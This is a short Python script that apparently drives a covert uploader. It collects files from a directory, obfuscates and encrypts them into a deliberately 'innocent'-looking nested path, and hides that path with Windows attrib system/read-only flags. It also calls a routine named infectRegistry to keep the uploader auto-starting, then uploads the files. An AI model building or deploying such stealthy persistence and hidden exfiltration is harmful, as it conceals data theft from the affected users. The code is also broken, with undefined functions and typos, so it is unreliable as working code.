"""
	sweep
	scan_n_resolve -- what to do with given file [upload, version, rename,
		user_intervention]
	create obfus names for new uploads
	encrypt files and diffs to be uploaded
	attrib +s +r *.* @@ hidden_upload_dir
	affirm that robust_uploader is auto-start and running
"""

import os
import sys
import subprocess

import sweeper
import scan_n_resolve
import obfuscate_fileNames

def main(targerDir):
	input("Before starting, please consider freeing up more RAM by killing \
	unnecessary process . . .")
	if sweeper.sweep(targerDir):
		uploadJob = scan_n_resolve.getJob(targerDir)
	else:
		sys.exit("You didn't clean the shit")

	# internally calls encryptFiles
	deep_nested_innocent_path = obfuscate_fileNames.main(uploadJob)

	subprocess.run("attrib +r +s \"%s\"" % deep_nested_innocent_path)#, shell=True)
	subprocess.run("attrib +r +s \"%s/*.*\" /s /d" % deep_nested_innocent_path)#, shell=True)

	baseUtils.infectRegistry()

	upload(deep_nested_innocent_path)
	return

if __name__ == '__main__':
	for aDir in sys.argv[1:]:
		if os.path.isdir(aDir):
			main(aDir)
		else:
			continue
